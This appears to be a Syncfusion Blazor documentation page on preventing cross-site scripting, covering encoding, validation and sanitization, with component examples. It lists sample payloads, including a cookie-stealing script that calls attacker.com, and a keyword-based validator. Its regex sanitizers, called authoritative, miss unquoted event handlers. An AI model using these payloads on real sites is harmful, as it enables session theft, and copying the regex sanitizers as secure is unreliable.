---
layout: post
title: Cross-Site Scripting (XSS) Security | Syncfusion Blazor
description: Protect Syncfusion Blazor apps from XSS using built‑in sanitization, server-side validation, and essential security best practices.
platform: Blazor
control: Common
documentation: ug
---

# Cross-Site Scripting (XSS) Security in Blazor Applications

## Overview

Cross-Site Scripting (XSS) is one of the most common security problems in web applications. This guide explains how to protect Syncfusion<sup style="font-size:70%">&reg;</sup> Blazor application from XSS attacks. It covers built-in client-side sanitization, server-side validation, and safe usage guidelines for components that handle user‑generated content.

## What is Cross-Site Scripting (XSS)?

XSS is a vulnerability where attackers insert harmful code into your application, causing it to run in the user’s browser with the same access level as your app. This can result in

- **Session hijacking** - Stealing authentication tokens or cookies
- **Data theft** - Accessing sensitive user information
- **Malware distribution** - Redirecting users to malicious sites
- **UI manipulation** - Altering what users see on the screen
- **Credential theft** - Capturing information entered into forms, such as usernames or passwords

### Types of XSS Attacks

1. **Stored XSS** - The attacker saves malicious code in your database, and it runs whenever another user loads the affected page. This is the most dangerous type.
2. **Reflected XSS** - The harmful script is delivered through a URL or form input and is immediately sent back in the response, causing it to execute in the user’s browser.
3. **DOM-based XSS** - Client-side scripts read unsafe data and write it directly into the page.

## Why XSS Matters in Blazor Applications

Blazor Server and Blazor WebAssembly come with different types of XSS risks.

### Blazor Server

- All logic runs on the server, so validation is easier, but XSS can still happen if unsafe content is displayed.
- If an XSS attack happens, an attacker could potentially take control of the SignalR connection that Blazor depends on.
- The user's session state and backend resources could be compromised.

### Blazor WebAssembly

- The entire application runs directly in the browser, giving malicious scripts full access to the DOM if they are injected.
- Sensitive data like API tokens or client‑side credentials can be exposed more easily.
- Server‑side validation doesn’t apply automatically, so extra care is needed.
- Running a larger part of the app in the browser makes it more exposed to security risks.

## XSS Threat Model and Attack Vectors

### Common Attack Vectors

XSS can enter an application in many different ways. The most common source is user input, such as comments, chat messages, or any data that users type into forms.

Data received from APIs, uploaded files, or text copied from other websites can also contain harmful scripts.

Even information already stored in the database may be unsafe if it was not validated or sanitized before being saved.

### Example Attack Payloads

```html

<!-- Script injection -->
<script>document.location='http://attacker.com/steal?cookie='+document.cookie</script>

<!-- Event handler injection -->
<img src="x" onerror="alert('XSS')" />

<!-- SVG-based attack -->
<svg onload="alert('XSS')">

<!-- Data attribute abuse -->
<div data-bind="innerHTML: maliciousContent"></div>

<!-- JavaScript protocol -->
<a href="javascript:void(document.cookie='stolen')">Click here</a>

```

## How to Prevent XSS Attacks

Protecting your application from XSS requires using several layers of defense.

### 1. Output Encoding

Blazor automatically turns special characters in user input into safe, readable text. For example, a `<script>` tag will appear as visible text on the page instead of running as code.

Use `@userInput` whenever you want to safely display text on the page. Only use `MarkupString` when the HTML has already been sanitized on the server.

```html

@* Safe - Blazor automatically encodes *@
<p>@userInput</p>

@* UNSAFE - Bypasses encoding; only safe if sanitized *@
<p>@((MarkupString)userInput)</p>

```

### 2. Input Validation

Validating user input as soon as it is received helps prevent harmful content, such as `<script>` tags, from being stored or sent to other users. This acts as an early safety check and helps stop harmful data before it reaches deeper parts of your application.

Follow these practices when validating input.

- Always validate on the server side, not just the client side.
- Set maximum length limits for every input field.
- Use strong typing along with data annotation attributes.
- Block input that clearly contains suspicious or harmful content.
- For file uploads, verify the file type, file size, and actual file content before processing.


```csharp

using System;
using System.ComponentModel.DataAnnotations;

public class Comment
{
    [Required(ErrorMessage = "Comment is required.")]
    [StringLength(5000, ErrorMessage = "Comment must be 5000 characters or fewer.")]
    [SafeContent(ErrorMessage = "Comment contains potentially unsafe content.")]
    public string Content { get; set; } = string.Empty;
}

public sealed class SafeContentAttribute : ValidationAttribute
{
    protected override ValidationResult IsValid(object value, ValidationContext context)
    {
        var s = (value as string)?.Trim() ?? string.Empty;

        if (s.IndexOf("<script", StringComparison.OrdinalIgnoreCase) >= 0)
            return new ValidationResult(ErrorMessage);

        if (s.IndexOf("onerror=", StringComparison.OrdinalIgnoreCase) >= 0 ||
            s.IndexOf("onload=",  StringComparison.OrdinalIgnoreCase) >= 0 ||
            s.IndexOf("javascript:", StringComparison.OrdinalIgnoreCase) >= 0)
            return new ValidationResult(ErrorMessage);

        return ValidationResult.Success!;
    }
}

```

### 3. HTML Sanitization

If your app allows users to enter rich HTML, such as through a rich text editor, you must sanitize it. Sanitization removes harmful or unsafe HTML while keeping safe formatting tags like `<p>`, `<b>`, and `<br>`.

Only the HTML tags you explicitly allow are kept. Always sanitize content before saving it to the database and again before displaying it, including content that comes from external sources.

#### Built-in Sanitization with Syncfusion<sup style="font-size:70%">&reg;</sup> Components

The `EnableHtmlSanitizer` property is available in the Syncfusion<sup style="font-size:70%">&reg;</sup> **RichTextEditor** and **BlockEditor** components. It provides built-in client-side XSS protection.

#### How EnableHtmlSanitizer Works

When `EnableHtmlSanitizer` is enabled (it is `true` by default), the sanitizer does the following.

1. Removes `<script>` tags and their content
2. Removes event handler attributes such as `onclick`, `onerror`, and `onload`
3. Blocks unsafe protocols like javascript: scheme
4. Neutralizes other potentially dangerous HTML elements
5. Preserves safe formatting tags (`<p>`, `<b>`, `<i>`, `<ul>`, etc.)

> **Important:** Client-side sanitization alone cannot keep your application fully secure. The `EnableHtmlSanitizer` feature helps with basic cleanup and improves safety, but you still need server-side sanitization to properly protect your application.

#### Why Client-Side Sanitization Is Not Enough

1. **Bypass potential** - Attackers can disable JavaScript or modify requests before they reach the server.
2. **No database protection** - Even if the UI blocks harmful HTML, attackers can still send malicious content that gets stored in your database.
3. **API vulnerability** - API calls made directly to the backend skip all client-side checks.
4. **Zero trust principle** - Client side validation should never be trusted as a complete security measure.

#### When to Use EnableHtmlSanitizer

- To catch accidental HTML and improve the user experience
- To provide an extra layer of defense on top of server side sanitization
- To give immediate feedback without waiting for a server round trip

#### When Not to Use EnableHtmlSanitizer

- As the only security mechanism in your app
- As a replacement for server side sanitization

#### BlockEditor with EnableHtmlSanitizer

```csharp

@using Syncfusion.Blazor.BlockEditor;

<div id="container">
    <SfBlockEditor Blocks="@BlocksData" EnableHtmlSanitizer="true"></SfBlockEditor>
</div>
@code {
    private List<BlockModel> BlocksData = new()
    {
        new BlockModel
        {
            BlockType = BlockType.Paragraph,
            Content = new()
            {
                new ContentModel
                {
                    ContentType = ContentType.Text,
                    Content = "Safe content here"
                }
            }
        }
    };
}

```

#### RichTextEditor with Client‑Side and Server‑Side Sanitization

```csharp

@using Syncfusion.Blazor.RichTextEditor
@using System.Net.Http.Json
@inject HttpClient Http

<SfRichTextEditor @bind-Value="@ArticleContent"
                  EnableHtmlSanitizer="true">
    <RichTextEditorToolbarSettings Items="@Tools" />
</SfRichTextEditor>

<button class="e-btn e-primary" @onclick="SaveArticle">Save</button>

@code {
    private string ArticleContent { get; set; } = string.Empty;

    private List<ToolbarItemModel> Tools = new()
    {
        new ToolbarItemModel() { Command = ToolbarCommand.Bold },
        new ToolbarItemModel() { Command = ToolbarCommand.Italic },
        new ToolbarItemModel() { Command = ToolbarCommand.Underline }
    };

    private class SanitizedContent
    {
        public string CleanContent { get; set; } = string.Empty;
    }

    private async Task SaveArticle()
    {
        // Server-side sanitization required
        var response = await Http.PostAsJsonAsync("api/articles/sanitize",
            new { content = ArticleContent });
        if (response.IsSuccessStatusCode)
        {
            var result = await response.Content.ReadFromJsonAsync<SanitizedContent>();
            await StoreInDatabase(result!.CleanContent);
        }
    }

    private Task StoreInDatabase(string cleanHtml) => Task.CompletedTask;
}

```

### Safe HTML Rendering in Data Components

Components that display user-generated or database content, such as **DataGrid** and **ListView**, follow the same rule: only render HTML that has been sanitized on the server, or display plain text which Blazor encodes automatically.

#### DataGrid Templates

Grid templates should display only content that has already been sanitized on the server. Any unsanitized HTML must never be rendered directly.

#### UNSAFE - Direct HTML Rendering

The example below shows a scenario that should never be used. It renders raw HTML from the data source using `MarkupString`, which bypasses Blazor’s HTML encoding.

If the content includes malicious scripts, it can lead to `XSS (Cross‑Site Scripting)` attacks.

```csharp

@* NEVER DO THIS *@
<SfGrid DataSource="@Comments">
    <GridColumns>
        <GridColumn Field="@nameof(Comment.Content)">
            <Template>
                @{
                    var comment = (context as Comment);
                    @((MarkupString)comment.Content) @* UNSAFE! *@
                }
            </Template>
        </GridColumn>
    </GridColumns>
</SfGrid>

```

#### SAFE - Sanitized MarkupString (Server-Side Sanitization via API)

In this example, the HTML content is cleaned and sanitized on the server before it is returned by the API.

The `SanitizedContent` property contains only safe HTML, so rendering it with `MarkupString` is secure.

```csharp

@using System.Net.Http.Json
@inject HttpClient Http

<SfGrid DataSource="@Comments">
    <GridColumns>
        <GridColumn Field="@nameof(Comment.Author)" HeaderText="Author" Width="150" />
        <GridColumn HeaderText="Comment" Width="400">
            <Template Context="comment">
                @((MarkupString)comment.SanitizedContent)
            </Template>
        </GridColumn>
        <GridColumn Field="@nameof(Comment.CreatedAt)" HeaderText="Date" Width="150" Format="d" TextAlign="TextAlign.Center" />
    </GridColumns>
</SfGrid>

@code {
    private List<Comment> Comments { get; set; } = new();

    protected override async Task OnInitializedAsync()
    {
        // Content is sanitized on the server before being returned
        Comments = await Http.GetFromJsonAsync<List<Comment>>("api/comments") ?? new();
    }
}

public class Comment
{
    public int Id { get; set; }
    public string Author { get; set; } = string.Empty;
    public string Content { get; set; } = string.Empty;
    public string SanitizedContent { get; set; } = string.Empty;
    public DateTime CreatedAt { get; set; }
}

```

#### Alternative - Text-Only Rendering

If HTML formatting is not required, render the content as plain text. Blazor automatically encodes all special characters, ensuring no injected scripts can execute regardless of what the data source contains.

```csharp

<SfGrid DataSource="@Comments">
    <GridColumns>
        <GridColumn Field="@nameof(Comment.Content)" HeaderText="Comment">
            <Template Context="comment">
                @comment.Content @* Safe - Blazor auto-encodes *@
            </Template>
        </GridColumn>
    </GridColumns>
</SfGrid>

```

#### ListView with Custom Templates

The same safe rendering rules apply to ListView when displaying user-generated content.

The following example conditionally renders content based on whether the message contains HTML. When `IsHtml` is `true`, only pre-sanitized content stored in `SanitizedContent` is rendered as markup. Otherwise, plain text is displayed using Blazor's automatic encoding. This keeps all messages safe regardless of their format.

```csharp

@using Syncfusion.Blazor.Lists

<SfListView DataSource="@Messages"
            CssClass="e-list-template"
            EnableVirtualization="true">
    <ListViewFieldSettings Text="Content" Id="Id"></ListViewFieldSettings>
    <ListViewTemplates>
        <Template Context="message">
            <div class="message-container">
                <div class="message-header">
                    <strong>@message.Sender</strong>
                    <span class="timestamp">@message.Timestamp.ToShortTimeString()</span>
                </div>
                <div class="message-body">
                    @if (message.IsHtml)
                    {
                        @((MarkupString)message.SanitizedContent)
                    }
                    else
                    {
                        @message.Content @* Plain text - auto-encoded *@
                    }
                </div>
            </div>
        </Template>
    </ListViewTemplates>
</SfListView>

@code {
    private List<ChatMessage> Messages { get; set; } = new();

    public class ChatMessage
    {
        public int Id { get; set; }
        public string Sender { get; set; } = string.Empty;
        public string Content { get; set; } = string.Empty;
        public string SanitizedContent { get; set; } = string.Empty;
        public bool IsHtml { get; set; }
        public DateTime Timestamp { get; set; }
    }
}

```

## Server-Side Sanitization (Authoritative)

Server-side sanitization is the **authoritative and required** defense against XSS attacks. Always treat it as the authoritative layer in your security strategy.

### Built-in .NET Sanitization Support

The `System.Text.Encodings.Web` namespace is part of the .NET SDK, so no additional packages are needed.

| Namespace | Class | Purpose |
|---|---|---|
| `System.Text.Encodings.Web` | `HtmlEncoder` | Encode all HTML special characters |
| `System.Text.RegularExpressions` | `Regex` | Strip disallowed tags and attributes |
| `System.Web` | `HttpUtility.HtmlEncode` | Encode HTML in non-web contexts |

### Server-Side Sanitization Example

```csharp

using System.Text.Encodings.Web;
using System.Text.RegularExpressions;

public class ContentService
{
    private readonly AppDbContext _context;

    // Allow-list of safe HTML tags
    private static readonly string[] AllowedTags =
    {
        "p", "br", "strong", "em", "u", "ol", "ul", "li",
        "h1", "h2", "h3", "h4", "h5", "h6", "blockquote", "a", "img"
    };

    public ContentService(AppDbContext context)
    {
        _context = context;
    }

    /// <summary>Strips all tags not in the allow-list and removes dangerous attributes.</summary>
    public string SanitizeHtml(string input)
    {
        if (string.IsNullOrEmpty(input))
            return string.Empty;

        // Remove tags outside allow-list
        var tagPattern = $@"<(?!/?(?:{string.Join("|", AllowedTags)})\b)[^>]*>";
        var result = Regex.Replace(input, tagPattern, string.Empty, RegexOptions.IgnoreCase);

        // Remove event handler attributes
        result = Regex.Replace(result, @"\s+on\w+\s*=\s*(""[^""]*""|'[^']*')", string.Empty, RegexOptions.IgnoreCase);

        // Remove javascript: protocol in href/src
        result = Regex.Replace(result, @"(href|src)\s*=\s*[""']?\s*javascript:[^""'>]*[""']?",
            string.Empty, RegexOptions.IgnoreCase);

        return result;
    }

    /// <summary>Fully encodes input — use for plain text fields.</summary>
    public string EncodeText(string input)
        => HtmlEncoder.Default.Encode(input ?? string.Empty);

    // Sanitize before storing
    public async Task<BlogPost> CreatePostAsync(BlogPost post)
    {
        post.Title   = EncodeText(post.Title);
        post.Content = SanitizeHtml(post.Content);
        post.Summary = EncodeText(post.Summary);

        _context.BlogPosts.Add(post);
        await _context.SaveChangesAsync();

        return post;
    }

    // Sanitize when retrieving (defense-in-depth)
    public async Task<BlogPost> GetPostAsync(int id)
    {
        var post = await _context.BlogPosts.FindAsync(id);
        if (post != null)
        {
            post.Content = SanitizeHtml(post.Content);
        }
        return post;
    }
}

```

### API Controller Example

```csharp

using System.Text.Encodings.Web;
using System.Text.RegularExpressions;

[ApiController]
[Route("api/[controller]")]
public class CommentsController : ControllerBase
{
    private readonly CommentRepository _repository;

    public CommentsController(CommentRepository repository)
    {
        _repository = repository;
    }

    [HttpPost]
    public async Task<IActionResult> CreateComment([FromBody] CommentDto dto)
    {
        // Server-side validation
        if (string.IsNullOrWhiteSpace(dto.Content))
        {
            return BadRequest("Content is required");
        }

        // Sanitize before storing
        var comment = new Comment
        {
            Author    = HtmlEncoder.Default.Encode(dto.Author),
            Content   = SanitizeAllowedTags(dto.Content),
            CreatedAt = DateTime.UtcNow
        };

        await _repository.AddAsync(comment);
        return Ok(comment);
    }

    private static string SanitizeAllowedTags(string input)
    {
        if (string.IsNullOrEmpty(input)) return string.Empty;

        var allowed = new[] { "p", "br", "b", "i", "u" };
        var pattern = $@"<(?!/?(?:{string.Join("|", allowed)})\b)[^>]*>";
        var result  = Regex.Replace(input, pattern, string.Empty, RegexOptions.IgnoreCase);

        result = Regex.Replace(result, @"\s+on\w+\s*=\s*(""[^""]*""|'[^']*')", string.Empty, RegexOptions.IgnoreCase);
        return result;
    }
}

``` 